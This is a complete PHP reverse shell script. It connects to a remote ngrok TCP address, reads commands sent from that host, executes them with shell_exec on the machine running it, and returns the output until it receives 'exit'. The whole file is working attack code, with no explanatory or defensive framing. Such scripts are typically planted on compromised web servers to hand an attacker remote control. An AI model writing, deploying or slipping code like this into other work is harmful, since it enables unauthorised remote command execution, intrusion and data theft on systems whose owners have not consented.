<?php
set_time_limit(0);
$VERSION = "1.0";
$ip = "0.tcp.in.ngrok.io";  // Your ngrok TCP address
$port = 15159;              // Your specified port

// Create a socket connection
$sock = fsockopen($ip, $port);
if (!$sock) {
    die("Could not connect to $ip on port $port\n");
}

// Send the shell's output back to the server
while (true) {
    // Read the command from the server
    $cmd = fgets($sock);
    if (strpos($cmd, "exit") !== false) {
        break;  // Exit the loop if the command is "exit"
    }

    // Execute the command and send the output back to the server
    $output = shell_exec($cmd);
    fwrite($sock, $output);
}

// Close the socket
fclose($sock);
?>
